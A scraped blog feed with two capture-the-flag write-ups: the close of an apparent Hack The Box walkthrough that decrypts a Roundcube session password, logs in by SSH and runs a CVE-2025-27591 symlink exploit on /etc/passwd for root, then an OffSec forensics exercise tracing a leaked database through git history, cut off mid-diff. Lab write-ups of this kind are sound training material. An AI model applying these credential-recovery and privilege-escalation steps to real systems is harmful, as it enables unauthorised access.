+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">6a5ktqih5uca6lj8vrmgh9v0oh      2025-06-08 15:46:40     172.17.0.1      bGFuZ3VhZ2V8czo1OiJlbl9VUyI7aW1hcF9uYW1lc3BhY2V8YTo0OntzOjg6InBlcnNvbmFsIjthOjE6e2k6MDthOjI6e2k6MDtzOjA6IiI7aToxO3M6MToiLyI7fX1zOjU6Im90aGVyIjtOO3M6Njoic2hhcmVkIjtOO3M6MTA6InByZWZpeF9vdXQiO3M6MDoiIjt9aW1hcF9kZWxpbWl0ZXJ8czoxOiIvIjtpbWFwX2xpc3RfY29uZnxhOjI6e2k6MDtOO2k6MTthOjA6e319dXNlcl9pZHxpOjE7dXNlcm5hbWV8czo1OiJqYWNvYiI7c3RvcmFnZV9ob3N0fHM6OToibG9jYWxob3N0IjtzdG9yYWdlX3BvcnR8aToxNDM7c3RvcmFnZV9zc2x8YjowO3Bhc3N3b3JkfHM6MzI6Ikw3UnYwMEE4VHV3SkFyNjdrSVR4eGNTZ25JazI1QW0vIjtsb2dpbl90aW1lfGk6MTc0OTM5NzExOTt0aW1lem9uZXxzOjEzOiJFdXJvcGUvTG9uZG9uIjtTVE9SQUdFX1NQRUNJQUwtVVNFfGI6MTthdXRoX3NlY3JldHxzOjI2OiJEcFlxdjZtYUk5SHhETDVHaGNDZDhKYVFRVyI7cmVxdWVzdF90b2tlbnxzOjMyOiJUSXNPYUFCQTF6SFNYWk9CcEg2dXA1WEZ5YXlOUkhhdyI7dGFza3xzOjQ6Im1haWwiO3NraW5fY29uZmlnfGE6Nzp7czoxNzoic3VwcG9ydGVkX2xheW91dHMiO2E6MTp7aTowO3M6MTA6IndpZGVzY3JlZW4iO31zOjIyOiJqcXVlcnlfdWlfY29sb3JzX3RoZW1lIjtzOjk6ImJvb3RzdHJhcCI7czoxODoiZW1iZWRfY3NzX2xvY2F0aW9uIjtzOjE3OiIvc3R5bGVzL2VtYmVkLmNzcyI7czoxOToiZWRpdG9yX2Nzc19sb2NhdGlvbiI7czoxNzoiL3N0eWxlcy9lbWJlZC5jc3MiO3M6MTc6ImRhcmtfbW9kZV9zdXBwb3J0IjtiOjE7czoyNjoibWVkaWFfYnJvd3Nlcl9jc3NfbG9jYXRpb24iO3M6NDoibm9uZSI7czoyMToiYWRkaXRpb25hbF9sb2dvX3R5cGVzIjthOjM6e2k6MDtzOjQ6ImRhcmsiO2k6MTtzOjU6InNtYWxsIjtpOjI7czoxMDoic21hbGwtZGFyayI7fX1pbWFwX2hvc3R8czo5OiJsb2NhbGhvc3QiO3BhZ2V8aToxO21ib3h8czo1OiJJTkJPWCI7c29ydF9jb2x8czowOiIiO3NvcnRfb3JkZXJ8czo0OiJERVNDIjtTVE9SQUdFX1RIUkVBRHxhOjM6e2k6MDtzOjEwOiJSRUZFUkVOQ0VTIjtpOjE7czo0OiJSRUZTIjtpOjI7czoxNDoiT1JERVJFRFNVQkpFQ1QiO31TVE9SQUdFX1FVT1RBfGI6MDtTVE9SQUdFX0xJU1QtRVhURU5ERUR8YjoxO2xpc3RfYXR0cmlifGE6Njp7czo0OiJuYW1lIjtzOjg6Im1lc3NhZ2VzIjtzOjI6ImlkIjtzOjExOiJtZXNzYWdlbGlzdCI7czo1OiJjbGFzcyI7czo0MjoibGlzdGluZyBtZXNzYWdlbGlzdCBzb3J0aGVhZGVyIGZpeGVkaGVhZGVyIjtzOjE1OiJhcmlhLWxhYmVsbGVkYnkiO3M6MjI6ImFyaWEtbGFiZWwtbWVzc2FnZWxpc3QiO3M6OToiZGF0YS1saXN0IjtzOjEyOiJtZXNzYWdlX2xpc3QiO3M6MTQ6ImRhdGEtbGFiZWwtbXNnIjtzOjE4OiJUaGUgbGlzdCBpcyBlbXB0eS4iO311bnNlZW5fY291bnR8YToyOntzOjU6IklOQk9YIjtpOjI7czo1OiJUcmFzaCI7aTowO31mb2xkZXJzfGE6MTp7czo1OiJJTkJPWCI7YToyOntzOjM6ImNudCI7aToyO3M6NjoibWF4dWlkIjtpOjM7fX1saXN0X21vZF9zZXF8czoyOiIxMCI7</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<h2 id="Password-Decryption"><a href="#Password-Decryption" class="headerlink" title="Password Decryption"></a>Password Decryption</h2><h3 id="Decoding-the-Session-Data"><a href="#Decoding-the-Session-Data" class="headerlink" title="Decoding the Session Data"></a>Decoding the Session Data</h3><p>I found something interesting. I used CyberChef to decode the Base64 session data and found:</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">é®d¶¨¡æçêXü¾¹ Ûô¢´Û4ì</span><br><span class="line">&lt;×:ãM&#123;Ûí&#123;ûOµlanguage|s:5:&quot;en_US&quot;;imap_namespace|a:4:&#123;s:8:&quot;personal&quot;;a:1:&#123;i:0;a:2:&#123;i:0;s:0:&quot;&quot;;i:1;s:1:&quot;/&quot;;&#125;&#125;s:5:&quot;other&quot;;N;s:6:&quot;shared&quot;;N;s:10:&quot;prefix_out&quot;;s:0:&quot;&quot;;&#125;imap_delimiter|s:1:&quot;/&quot;;imap_list_conf|a:2:&#123;i:0;N;i:1;a:0:&#123;&#125;&#125;user_id|i:1;username|s:5:&quot;jacob&quot;;storage_host|s:9:&quot;localhost&quot;;storage_port|i:143;storage_ssl|b:0;password|s:32:&quot;L7Rv00A8TuwJAr67kITxxcSgnIk25Am/&quot;;login_time|i:1749397119;timezone|s:13:&quot;Europe/London&quot;;STORAGE_SPECIAL-USE|b:1;auth_secret|s:26:&quot;DpYqv6maI9HxDL5GhcCd8JaQQW&quot;;request_token|s:32:&quot;TIsOaABA1zHSXZOBpH6up5XFyayNRHaw&quot;;task|s:4:&quot;mail&quot;;skin_config|a:7:&#123;s:17:&quot;supported_layouts&quot;;a:1:&#123;i:0;s:10:&quot;widescreen&quot;;&#125;s:22:&quot;jquery_ui_colors_theme&quot;;s:9:&quot;bootstrap&quot;;s:18:&quot;embed_css_location&quot;;s:17:&quot;/styles/embed.css&quot;;s:19:&quot;editor_css_location&quot;;s:17:&quot;/styles/embed.css&quot;;s:17:&quot;dark_mode_support&quot;;b:1;s:26:&quot;media_browser_css_location&quot;;s:4:&quot;none&quot;;s:21:&quot;additional_logo_types&quot;;a:3:&#123;i:0;s:4:&quot;dark&quot;;i:1;s:5:&quot;small&quot;;i:2;s:10:&quot;small-dark&quot;;&#125;&#125;imap_host|s:9:&quot;localhost&quot;;page|i:1;mbox|s:5:&quot;INBOX&quot;;sort_col|s:0:&quot;&quot;;sort_order|s:4:&quot;DESC&quot;;STORAGE_THREAD|a:3:&#123;i:0;s:10:&quot;REFERENCES&quot;;i:1;s:4:&quot;REFS&quot;;i:2;s:14:&quot;ORDEREDSUBJECT&quot;;&#125;STORAGE_QUOTA|b:0;STORAGE_LIST-EXTENDED|b:1;list_attrib|a:6:&#123;s:4:&quot;name&quot;;s:8:&quot;messages&quot;;s:2:&quot;id&quot;;s:11:&quot;messagelist&quot;;s:5:&quot;class&quot;;s:42:&quot;listing messagelist sortheader fixedheader&quot;;s:15:&quot;aria-labelledby&quot;;s:22:&quot;aria-label-messagelist&quot;;s:9:&quot;data-list&quot;;s:12:&quot;message_list&quot;;s:14:&quot;data-label-msg&quot;;s:18:&quot;The list is empty.&quot;;&#125;unseen_count|a:2:&#123;s:5:&quot;INBOX&quot;;i:2;s:5:&quot;Trash&quot;;i:0;&#125;folders|a:1:&#123;s:5:&quot;INBOX&quot;;a:2:&#123;s:3:&quot;cnt&quot;;i:2;s:6:&quot;maxuid&quot;;i:3;&#125;&#125;list_mod_seq|s:2:&quot;10&quot;;</span><br></pre></td></tr></table></figure></div>
+
+<p><strong>Aha! We found the encrypted password:</strong></p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">password|s:32:&quot;L7Rv00A8TuwJAr67kITxxcSgnIk25Am/&quot;</span><br></pre></td></tr></table></figure></div>
+
+<h3 id="Method-1-Using-Roundcube-Decrypt-Script"><a href="#Method-1-Using-Roundcube-Decrypt-Script" class="headerlink" title="Method 1: Using Roundcube Decrypt Script"></a>Method 1: Using Roundcube Decrypt Script</h3><p>Now we need to decrypt it since it was encrypted using DES. I found the official decryption script from Roundcube:</p>
+<ul>
+<li><strong>Script:</strong> <a class="link"   href="https://github.com/roundcube/roundcubemail/blob/master/bin/decrypt.sh" >https://github.com/roundcube/roundcubemail/blob/master/bin/decrypt.sh<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></li>
+</ul>
+<p>Run the decryption:</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">php decrypt.sh <span class="string">&quot;L7Rv00A8TuwJAr67kITxxcSgnIk25Am/&quot;</span></span><br></pre></td></tr></table></figure></div>
+
+<p><strong>Decrypted password:</strong></p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">595mO8DmwGeD</span><br></pre></td></tr></table></figure></div>
+
+<h3 id="Method-2-Using-CyberChef-Alternative"><a href="#Method-2-Using-CyberChef-Alternative" class="headerlink" title="Method 2: Using CyberChef (Alternative)"></a>Method 2: Using CyberChef (Alternative)</h3><p>I also found another method to decrypt the password using CyberChef, although it’s harder compared to the script provided.</p>
+<p><strong>Step 1:</strong> Paste the encrypted password in CyberChef and convert it to hex:</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../image/HTB/Outbound/cyberchef1.png"
+                      alt="cyberchef1"
+                ></p>
+<p><strong>Step 2:</strong> Copy the first 8 hex values and use Triple DES decryption in CyberChef with the secret key we found earlier (<code>rcmail-!24ByteDESkey*Str</code>):</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../image/HTB/Outbound/cyberchef2.png"
+                      alt="cyberhcef2"
+                ></p>
+<p><strong>Result:</strong> We get the same password:</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">595mO8DmwGeD</span><br></pre></td></tr></table></figure></div>
+
+<h2 id="User-Access"><a href="#User-Access" class="headerlink" title="User Access"></a>User Access</h2><h3 id="SSH-Login-as-Jacob"><a href="#SSH-Login-as-Jacob" class="headerlink" title="SSH Login as Jacob"></a>SSH Login as Jacob</h3><p>After that, I signed in to SSH using the username <code>jacob</code> and the password we just decrypted:</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">┌──(global_venv)─(w_11㉿kali)-[~]</span><br><span class="line">└─$ ssh jacob@10.10.11.77                </span><br><span class="line">The authenticity of host &#x27;10.10.11.77 (10.10.11.77)&#x27; can&#x27;t be established.</span><br><span class="line">ED25519 key fingerprint is SHA256:OZNUeTZ9jastNKKQ1tFXatbeOZzSFg5Dt7nhwhjorR0.</span><br><span class="line">This key is not known by any other names.</span><br><span class="line">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span><br><span class="line">Warning: Permanently added &#x27;10.10.11.77&#x27; (ED25519) to the list of known hosts.</span><br><span class="line">jacob@10.10.11.77&#x27;s password: </span><br><span class="line">Welcome to Ubuntu 24.04.2 LTS (GNU/Linux 6.8.0-63-generic x86_64)</span><br><span class="line"></span><br><span class="line"> * Documentation:  https://help.ubuntu.com</span><br><span class="line"> * Management:     https://landscape.canonical.com</span><br><span class="line"> * Support:        https://ubuntu.com/pro</span><br><span class="line"></span><br><span class="line"> System information as of Thu Oct  2 07:27:26 PM UTC 2025</span><br><span class="line"></span><br><span class="line">  System load:  0.1               Processes:             255</span><br><span class="line">  Usage of /:   74.5% of 6.73GB   Users logged in:       0</span><br><span class="line">  Memory usage: 11%               IPv4 address for eth0: 10.10.11.77</span><br><span class="line">  Swap usage:   0%</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Expanded Security Maintenance for Applications is not enabled.</span><br><span class="line"></span><br><span class="line">0 updates can be applied immediately.</span><br><span class="line"></span><br><span class="line">Enable ESM Apps to receive additional future security updates.</span><br><span class="line">See https://ubuntu.com/esm or run: sudo pro status</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">The list of available updates is more than a week old.</span><br><span class="line">To check for new updates run: sudo apt update</span><br><span class="line">Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings</span><br><span class="line"></span><br><span class="line">Last login: Thu Oct  2 18:50:00 2025 from 10.10.14.18</span><br><span class="line">jacob@outbound:~$ </span><br></pre></td></tr></table></figure></div>
+
+<h3 id="Capturing-User-Flag"><a href="#Capturing-User-Flag" class="headerlink" title="Capturing User Flag"></a>Capturing User Flag</h3><p>After successfully logging in, I used cat on user.txt and found the first flag!</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">jacob@outbound:~$ ls</span><br><span class="line">exploit.py  exploit.sh  snapshot_01759431961_01759431961.nQJACc  user.txt</span><br><span class="line">jacob@outbound:~$ cat user.txt</span><br><span class="line">2e3eb95d86354c4825e2165a67654448</span><br></pre></td></tr></table></figure></div>
+
+<p><strong>Flag One:</strong> <code>2e3eb95d86354c4825e2165a67654448</code></p>
+<hr>
+<h2 id="Privilege-Escalation"><a href="#Privilege-Escalation" class="headerlink" title="Privilege Escalation"></a>Privilege Escalation</h2><h3 id="Discovering-Exploit-Files"><a href="#Discovering-Exploit-Files" class="headerlink" title="Discovering Exploit Files"></a>Discovering Exploit Files</h3><p>For the second flag, we need to gain root access to the server.</p>
+<p>Interestingly, I noticed there are <code>exploit.py</code> and <code>exploit.sh</code> files in jacob’s home directory. These shouldn’t normally be there—perhaps they were left behind from a previous attempt or are part of the challenge.</p>
+<h3 id="Exploiting-CVE-2025-27591"><a href="#Exploiting-CVE-2025-27591" class="headerlink" title="Exploiting CVE-2025-27591"></a>Exploiting CVE-2025-27591</h3><p>I decided to run the Python exploit that was conveniently available:</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">jacob@outbound:~$ python3 exploit.py</span><br><span class="line">[*] Checking for CVE-2025-27591 vulnerability...</span><br><span class="line">[+] /var/log/below is world-writable.</span><br><span class="line">[!] /var/log/below/error_root.log is a regular file. Removing it...</span><br><span class="line">[+] Symlink created: /var/log/below/error_root.log -&gt; /etc/passwd</span><br><span class="line">[+] Target is vulnerable.</span><br><span class="line">[*] Starting exploitation...</span><br><span class="line">[+] Wrote malicious passwd line to /tmp/attacker</span><br><span class="line">[+] Symlink set: /var/log/below/error_root.log -&gt; /etc/passwd</span><br><span class="line">[*] Executing &#x27;below record&#x27; as root to trigger logging...</span><br><span class="line">Oct 02 20:04:11.074 DEBG Starting up!</span><br><span class="line">Oct 02 20:04:11.074 ERRO </span><br><span class="line">----------------- Detected unclean exit ---------------------</span><br><span class="line">Error Message: Failed to acquire file lock on index file: /var/log/below/store/index_01759363200: EAGAIN: Try again</span><br><span class="line">-------------------------------------------------------------</span><br><span class="line">[+] &#x27;below record&#x27; executed.</span><br><span class="line">[*] Appending payload into /etc/passwd via symlink...</span><br><span class="line">[+] Payload appended successfully.</span><br><span class="line">[*] Attempting to switch to root shell via &#x27;su attacker&#x27;...</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<h3 id="Gaining-Root-Access"><a href="#Gaining-Root-Access" class="headerlink" title="Gaining Root Access"></a>Gaining Root Access</h3><p>The exploit successfully ran and I gained root access! </p>
+<p>The exploit leveraged <strong>CVE-2025-27591</strong>, which appears to be a vulnerability related to <code>/var/log/below</code> being world-writable, allowing a symlink attack on <code>/etc/passwd</code> to inject a malicious user with root privileges.</p>
+<h3 id="Capturing-Root-Flag"><a href="#Capturing-Root-Flag" class="headerlink" title="Capturing Root Flag"></a>Capturing Root Flag</h3><p>After gaining root access, I located and read the root flag:</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> /root/root.txt</span><br></pre></td></tr></table></figure></div>
+
+<p><strong>Flag Two:</strong> <code>f164ba6f0d37293719d9fa86b8f95cc8</code></p>
+<hr>
+<h2 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h2><p>This machine involved:</p>
+<ol>
+<li><strong>Reconnaissance:</strong> Using nmap to discover open ports and services</li>
+<li><strong>Vulnerability Identification:</strong> Finding CVE-2025-49113 affecting Roundcube Webmail 1.6.10</li>
+<li><strong>Initial Exploitation:</strong> Using the CVE exploit to gain www-data access</li>
+<li><strong>Enumeration:</strong> Discovering database credentials and DES encryption keys in configuration files</li>
+<li><strong>Password Extraction:</strong> Querying MySQL database to find encrypted passwords</li>
+<li><strong>Decryption:</strong> Using Roundcube’s decrypt script or CyberChef to decrypt DES-encrypted passwords</li>
+<li><strong>User Access:</strong> SSH login as jacob using decrypted credentials</li>
+<li><strong>Privilege Escalation:</strong> Exploiting CVE-2025-27591 for root access</li>
+</ol>
+<p><strong>Flags obtained:</strong></p>
+<ul>
+<li><strong>User Flag:</strong> <code>2e3eb95d86354c4825e2165a67654448</code></li>
+<li><strong>Root Flag:</strong> <code>f164ba6f0d37293719d9fa86b8f95cc8</code></li>
+</ul>
+]]></content>
+      <tags>
+        <tag>HTB</tag>
+        <tag>Linux Privilege Escalation</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Offsec-Gauntlet-Echo-Response</title>
+    <url>/2025/10/09/Offsec-Gauntlet-Echo-Response/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\node_modules\aplayer\dist\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\node_modules\aplayer\dist\Meting.min.js"></script><h1 id="First-Week"><a href="#First-Week" class="headerlink" title="First Week"></a>First Week</h1><h2 id="ProtoVault-Breach"><a href="#ProtoVault-Breach" class="headerlink" title="ProtoVault Breach"></a>ProtoVault Breach</h2><ol>
+<li>Determine if the leak could have come from the application. Review the database connection string to ensure it is secure. Submit the connection string here.</li>
+</ol>
+<ul>
+<li>postgresql:&#x2F;&#x2F;assetdba:<a class="link"   href="mailto:&#x38;&#x64;&#x36;&#x33;&#x31;&#x64;&#50;&#x32;&#48;&#x37;&#x65;&#99;&#49;&#100;&#101;&#98;&#x61;&#97;&#x66;&#x64;&#x38;&#48;&#54;&#x38;&#50;&#50;&#x31;&#50;&#50;&#x32;&#x35;&#x30;&#x40;&#112;&#103;&#x73;&#113;&#108;&#x5f;&#112;&#x72;&#x6f;&#x64;&#95;&#x64;&#x62;&#48;&#49;&#46;&#112;&#114;&#111;&#x74;&#111;&#103;&#117;&#97;&#x72;&#x64;&#x2e;&#108;&#x6f;&#99;&#x61;&#108;" >&#x38;&#x64;&#x36;&#x33;&#x31;&#x64;&#50;&#x32;&#48;&#x37;&#x65;&#99;&#49;&#100;&#101;&#98;&#x61;&#97;&#x66;&#x64;&#x38;&#48;&#54;&#x38;&#50;&#50;&#x31;&#50;&#50;&#x32;&#x35;&#x30;&#x40;&#112;&#103;&#x73;&#113;&#108;&#x5f;&#112;&#x72;&#x6f;&#x64;&#95;&#x64;&#x62;&#48;&#49;&#46;&#112;&#114;&#111;&#x74;&#111;&#103;&#117;&#97;&#x72;&#x64;&#x2e;&#108;&#x6f;&#99;&#x61;&#108;<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>&#x2F;pgamgt?sslmode&#x3D;verify-full</li>
+</ul>
+<p>Solving Method - Read through the source code and find out in the app.py file</p>
+<ol start="2">
+<li>Review the other source files. Which one may have leaked the database? Provide the file name.</li>
+</ol>
+<ul>
+<li>backup_db.py</li>
+</ul>
+<p>Solving Method - using git to find out the removed details<br><code>git log --oneline --all</code></p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><figcaption><span>(HEAD -> main) Release candidate</span></figcaption><table><tr><td class="code"><pre><span class="line">1cc71b0 Remove backup scripts</span><br><span class="line">ef917bb Add item details and notes forms</span><br><span class="line">2304052 Add data models</span><br><span class="line">9544195 database migration scripts</span><br><span class="line">503dba9 Add authentication</span><br><span class="line">2719901 UI refactor</span><br><span class="line">b400120 Initial commit: Flask app scaffold</span><br><span class="line">6dcfe41 Release candidate</span><br><span class="line">57b06cb Remove backup scripts</span><br><span class="line">6a65249 Add item details and notes forms</span><br><span class="line">5ad3c06 Add data models</span><br><span class="line">d0aa089 database migration scripts</span><br><span class="line">b461ed0 Add authentication</span><br><span class="line">6106ded UI refactor</span><br><span class="line">1cd3a17 Initial commit: Flask app scaffold</span><br><span class="line">a230bbc Release candidate</span><br><span class="line">8fe1a44 Remove backup scripts</span><br><span class="line">9f257d2 Add item details and notes forms</span><br><span class="line">f22ba8a Add data models</span><br><span class="line">b32d77d database migration scripts</span><br><span class="line">5fe83a8 Add authentication</span><br><span class="line">3654766 UI refactor</span><br><span class="line">444eb3a Initial commit: Flask app scaffold</span><br></pre></td></tr></table></figure></div>
+
+<p>then investigate <code>git show 1cc71b0</code></p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">commit 1cc71b0fcfcdbfefc7b59cecd898f13b532acc35</span><br><span class="line">Author: Walter &lt;walter.s@protoguard.local&gt;</span><br><span class="line">Date:   Thu Aug 14 09:32:00 2025 -0500</span><br><span class="line"></span><br><span class="line">    Remove backup scripts</span><br><span class="line"></span><br><span class="line">diff --git a/app/util/backup_db.py b/app/util/backup_db.py</span><br><span class="line">deleted file mode 100644</span><br><span class="line">index d1c22b6..0000000</span><br><span class="line">--- a/app/util/backup_db.py</span><br><span class="line">+++ /dev/null</span><br><span class="line">@@ -1,71 +0,0 @@</span><br><span class="line">-#!/usr/bin/env python3</span><br><span class="line">-import paramiko</span><br><span class="line">-import boto3</span><br><span class="line">-import codecs</span><br><span class="line">-import os</span><br><span class="line">-from scp import SCPClient</span><br><span class="line">-</span><br><span class="line">-# ==== CONFIGURATION ====</span><br><span class="line">-SSH_HOST = &quot;pgsql_prod_db01.protoguard.local&quot;</span><br><span class="line">-SSH_PORT = 22</span><br><span class="line">-SSH_USER = &quot;dbadmin&quot;</span><br><span class="line">-SSH_KEY = &quot;/home/walter/.ssh/pgsql_key&quot;</span><br><span class="line">-</span><br><span class="line">-DB_NAME = &quot;pgamgt&quot;</span><br><span class="line">-DB_USER = &quot;assetdba&quot;</span><br><span class="line">-BACKUP_FILENAME = &quot;db_backup.sql&quot;</span><br><span class="line">-LOCAL_BACKUP = f&quot;/tmp/&#123;BACKUP_FILENAME&#125;&quot;</span><br><span class="line">-ENC_BACKUP = f&quot;/tmp/&#123;BACKUP_FILENAME&#125;.xyz&quot;</span><br><span class="line">-</span><br><span class="line">-S3_BUCKET = &quot;protoguard-asset-management&quot;</span><br><span class="line">-S3_KEY = &quot;db_backup.xyz&quot;</span><br><span class="line">-S3_REGION = &quot;us-east-2&quot;</span><br><span class="line">-</span><br><span class="line">-</span><br><span class="line">-def create_ssh_client():</span><br><span class="line">-    client = paramiko.SSHClient()</span><br><span class="line">-    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())</span><br><span class="line">-    client.connect(SSH_HOST, port=SSH_PORT, username=SSH_USER, key_filename=SSH_KEY)</span><br><span class="line">-    return client</span><br><span class="line">-</span><br><span class="line">-</span><br><span class="line">-def run_backup():</span><br><span class="line">-    ssh = create_ssh_client()</span><br><span class="line">-    dump_cmd = f&quot;pg_dump -U &#123;DB_USER&#125; &#123;DB_NAME&#125; &gt; /tmp/&#123;BACKUP_FILENAME&#125;&quot;</span><br><span class="line">-    stdin, stdout, stderr = ssh.exec_command(dump_cmd)</span><br><span class="line">-    exit_code = stdout.channel.recv_exit_status()</span><br><span class="line">-    if exit_code != 0:</span><br><span class="line">-        print(&quot;[!] Error running pg_dump:&quot;, stderr.read().decode())</span><br><span class="line">-        ssh.close()</span><br><span class="line">-        return False</span><br><span class="line">-</span><br><span class="line">-    # Copy file to local</span><br><span class="line">-    with SCPClient(ssh.get_transport()) as scp:</span><br><span class="line">-        scp.get(f&quot;/tmp/&#123;BACKUP_FILENAME&#125;&quot;, LOCAL_BACKUP)</span><br><span class="line">-</span><br><span class="line">-    # Remove remote dump</span><br><span class="line">-    ssh.exec_command(f&quot;rm /tmp/&#123;BACKUP_FILENAME&#125;&quot;)</span><br><span class="line">-    ssh.close()</span><br><span class="line">-    return True</span><br><span class="line">-</span><br><span class="line">-</span><br><span class="line">-def encode():</span><br><span class="line">-    with open(LOCAL_BACKUP, &quot;r&quot;, encoding=&quot;utf-8&quot;, errors=&quot;ignore&quot;) as f:</span><br><span class="line">-        data = f.read()</span><br><span class="line">-    encoded = codecs.encode(data, &quot;rot_13&quot;)</span><br><span class="line">-    with open(ENC_BACKUP, &quot;w&quot;, encoding=&quot;utf-8&quot;) as f:</span><br><span class="line">-        f.write(encoded)</span><br><span class="line">-</span><br><span class="line">-</span><br><span class="line">-def upload_to_s3():</span><br><span class="line">-    s3 = boto3.client(&quot;s3&quot;, region_name=S3_REGION)</span><br><span class="line">-    s3.upload_file(ENC_BACKUP, S3_BUCKET, S3_KEY)</span><br><span class="line">-    print(f&quot;[+] Uploaded &#123;ENC_BACKUP&#125; to s3://&#123;S3_BUCKET&#125;/&#123;S3_KEY&#125;&quot;)</span><br><span class="line">-</span><br><span class="line">-</span><br><span class="line">-if __name__ == &quot;__main__&quot;:</span><br><span class="line">-    if run_backup():</span><br><span class="line">-        print(&quot;[+] Backup retrieved successfully.&quot;)</span><br><span class="line">-        encode()</span><br><span class="line">-        print(&quot;[+] Backup encoded.&quot;)</span><br><span class="line">-        upload_to_s3()</span><br><span class="line">diff --git a/app/util/restore_db.py b/app/util/restore_db.py</span><br><span class="line">deleted file mode 100644</span><br><span class="line">index 4cb16ad..0000000</span><br><span class="line">--- a/app/util/restore_db.py</span><br><span class="line">+++ /dev/null</span><br><span class="line">@@ -1,72 +0,0 @@</span><br><span class="line">-#!/usr/bin/env python3</span><br><span class="line">-import paramiko</span><br><span class="line">-import boto3</span><br><span class="line">-import codecs</span><br><span class="line">-import os</span><br><span class="line">-from scp import SCPClient</span><br><span class="line">-</span><br><span class="line">-# ==== CONFIGURATION ====</span><br><span class="line">-SSH_HOST = &quot;pgsql_prod_db01.protoguard.local&quot;</span><br><span class="line">-SSH_PORT = 22</span><br><span class="line">-SSH_USER = &quot;dbadmin&quot;</span><br><span class="line">-SSH_KEY = &quot;/home/walter/.ssh/pgsql_key&quot;</span><br><span class="line">-</span><br><span class="line">-DB_NAME = &quot;pgamgt&quot;</span><br><span class="line">-DB_USER = &quot;assetdba&quot;</span><br><span class="line">-BACKUP_FILENAME = &quot;db_backup.sql&quot;</span><br><span class="line">-LOCAL_BACKUP = f&quot;/tmp/&#123;BACKUP_FILENAME&#125;&quot;</span><br><span class="line">-ENC_BACKUP = f&quot;/tmp/&#123;BACKUP_FILENAME&#125;.xyz&quot;</span><br><span class="line">-</span><br><span class="line">-S3_BUCKET = &quot;protoguard-asset-management&quot;</span><br><span class="line">-S3_KEY = &quot;db_backup.xyz&quot;</span><br><span class="line">-S3_REGION = &quot;us-east-2&quot;</span><br><span class="line">-</span><br><span class="line">-</span><br><span class="line">-def create_ssh_client():</span><br><span class="line">-    client = paramiko.SSHClient()</span><br><span class="line">-    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())</span><br><span class="line">-    client.connect(SSH_HOST, port=SSH_PORT, username=SSH_USER, key_filename=SSH_KEY)</span><br><span class="line">-    return client</span><br><span class="line">-</span><br><span class="line">-</span><br><span class="line">-def download_from_s3():</span><br><span class="line">-    s3 = boto3.client(&quot;s3&quot;, region_name=S3_REGION)</span><br><span class="line">-    s3.download_file(S3_BUCKET, S3_KEY, LOCAL_BACKUP)</span><br><span class="line">-    print(f&quot;[+] Downloaded backup from s3://&#123;S3_BUCKET&#125;/&#123;S3_KEY&#125;&quot;)</span><br><span class="line">-</span><br><span class="line">-</span><br><span class="line">-def decode():</span><br><span class="line">-    with open(LOCAL_BACKUP, &quot;r&quot;, encoding=&quot;utf-8&quot;) as f:</span><br><span class="line">-        data = f.read()</span><br><span class="line">-    decoded = codecs.decode(data, &quot;rot_13&quot;)</span><br><span class="line">-    with open(LOCAL_BACKUP, &quot;w&quot;, encoding=&quot;utf-8&quot;) as f:</span><br><span class="line">-        f.write(decoded)</span><br><span class="line">-</span><br><span class="line">-</span><br><span class="line">-def restore_backup():</span><br><span class="line">-    ssh = create_ssh_client()</span><br><span class="line">-</span><br><span class="line">-    # Copy file to remote</span><br><span class="line">-    with SCPClient(ssh.get_transport()) as scp:</span><br><span class="line">-        scp.put(LOCAL_BACKUP, f&quot;/tmp/&#123;BACKUP_FILENAME&#125;&quot;)</span><br><span class="line">-</span><br><span class="line">-    # Restore using psql</span><br><span class="line">-    restore_cmd = f&quot;psql -U &#123;DB_USER&#125; -d &#123;DB_NAME&#125; -f /tmp/&#123;BACKUP_FILENAME&#125;&quot;</span><br><span class="line">-    stdin, stdout, stderr = ssh.exec_command(restore_cmd)</span><br><span class="line">-    exit_code = stdout.channel.recv_exit_status()</span><br><span class="line">-    if exit_code != 0:</span><br><span class="line">-        print(&quot;[!] Error restoring database:&quot;, stderr.read().decode())</span><br><span class="line">-    else:</span><br><span class="line">-        print(&quot;[+] Database restored successfully.&quot;)</span><br><span class="line">-</span><br><span class="line">-    # Clean up</span><br><span class="line">-    ssh.exec_command(f&quot;rm 